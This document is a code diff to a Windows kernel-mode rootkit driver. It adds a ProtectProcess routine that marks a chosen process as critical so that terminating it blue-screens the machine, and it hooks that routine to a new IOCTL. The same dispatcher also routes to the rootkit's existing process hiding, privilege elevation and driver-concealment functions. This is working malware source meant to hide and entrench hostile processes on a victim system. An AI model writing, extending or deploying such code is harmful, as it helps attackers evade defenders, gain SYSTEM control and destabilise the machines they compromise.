@@ -1,4 +1,5 @@
 #include "externs.h"
+#include <wdm.h>
 #pragma warning(push)
 #pragma warning(disable: 4100)  // Unreferenced formal parameter
 #pragma warning(disable : 4099)
@@ -68,9 +69,70 @@ VOID FlinkBlinkHide(PLIST_ENTRY Current) {
     return;
 }
 
-/*VOID HideProcessByName(UCHAR name[15]) {
-    GetImageFileNameOffset();
-}*/
+NTSTATUS ProtectProcess(UINT32 PID) {
+    if (GetImageFileNameOffset() == 0) {
+        debug_print("[!-!] Build number unknown, returning from ProtectProcess.\n");
+        return STATUS_UNSUCCESSFUL;
+    }
+    NTSTATUS status = STATUS_SUCCESS;
+
+    CLIENT_ID clientId;
+    HANDLE hProcess, hToken;
+
+    TOKEN_PRIVILEGES tkp = { 0 };
+    OBJECT_ATTRIBUTES objAttr;
+    ULONG BreakOnTermination = 1;
+
+    clientId.UniqueThread = NULL;
+    clientId.UniqueProcess = UlongToHandle(PID);
+    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
+
+    status = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &clientId);
+    if (status == STATUS_UNSUCCESSFUL) {
+        // crap
+        debug_print("[-] Failed to open process to use on ProtectProcess, returning.\n");
+        return status;
+    }
+    status = ZwOpenProcessTokenEx(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, OBJ_KERNEL_HANDLE, &hToken);
+    if (status == STATUS_UNSUCCESSFUL) {
+        // ugh
+        debug_print("[-] Failed to open process token to use on ProtectProcess, returning.\n");
+        ZwClose(hToken);
+        return status;
+    }
+
+    tkp.PrivilegeCount = 1;
+    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; // Set as critical
+    tkp.Privileges[0].Luid = RtlConvertLongToLuid(SE_DEBUG_PRIVILEGE);  // Set as critical
+
+    status = ZwAdjustPrivilegesToken(hToken, FALSE, &tkp, 0, NULL, NULL);
+    if (status == STATUS_UNSUCCESSFUL) {
+        // smhhhhh
+        debug_print("[-] Failed to adjust token privs to use on ProtectProcess, returning.\n");
+        ZwClose(hToken);
+        return status;
+    }
+    status = ZwSetInformationProcess(hProcess, ProcessBreakOnTermination, &BreakOnTermination, sizeof(ULONG));
+    if (status == STATUS_UNSUCCESSFUL) {
+        // dude
+        debug_print("[-] Failed to set process information to use on ProtectProcess, returning.\n");
+        ZwClose(hToken);
+        return status;
+    }
+    debug_print("[+] Process is now set as CRITICAL.\n");
+
+    tkp.Privileges[0].Luid = RtlConvertLongToLuid(SE_TCB_PRIVILEGE);
+    status = ZwSetInformationProcess(hProcess, ProcessBreakOnTermination, &BreakOnTermination, sizeof(ULONG));
+    if (status == STATUS_UNSUCCESSFUL) {
+        // on the verge of success, we fail.
+        debug_print("[-] Failed to set process information (second time) to use on ProtectProcess, returning.\n");
+        ZwClose(hToken);
+        return status;
+    }
+    debug_print("[+] Process is now part of the SYSTEM, termination will result to blue screen, restart to revert.\n");
+    ZwClose(hToken);
+    return status;
+}
 
 VOID HideProcess(UINT32 PID) {
     if (GetImageFileNameOffset() == 0) {
@@ -139,7 +201,6 @@ NTSTATUS ElevateProcess(UINT32 PID) {
         debug_print("[!-!] Aborting ElevateProcess, unknown build.");
         return STATUS_UNSUCCESSFUL;
     }
-    GetImageFileNameOffset();
     DbgPrint("[+] Starting to elevate process %u.\n", PID);
     NTSTATUS status = STATUS_SUCCESS;
     PEPROCESS pTargetProcess, pSystemProcess;
@@ -229,8 +290,9 @@ void HideDriverHandler(PDRIVER_OBJECT DriverObject) {
 
     // Release the spinlock
     KeReleaseSpinLock(&g_Lock, oldIrql);
-    debug_print("[+] Driver is now hidden.\n");
+    debug_print("[+] Driver is now hidden, spinlock released.\n");
 }
+
 
 /*
 End Of Functions.
@@ -245,6 +307,8 @@ namespace Rootkit {
             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x697, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
         constexpr ULONG HideProcess =
             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x698, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
+        constexpr ULONG ProtectProcess =
+            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x699, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
     }
     struct Request {
         HANDLE process_id;
@@ -313,6 +377,9 @@ namespace Rootkit {
             break;
         case codes::HideProcess:
             HideProcess(HandleToUlong(pid));
+            break;
+        case codes::ProtectProcess:
+            ProtectProcess(HandleToUlong(pid));
             break;
         default:
             // something is horribly wrong
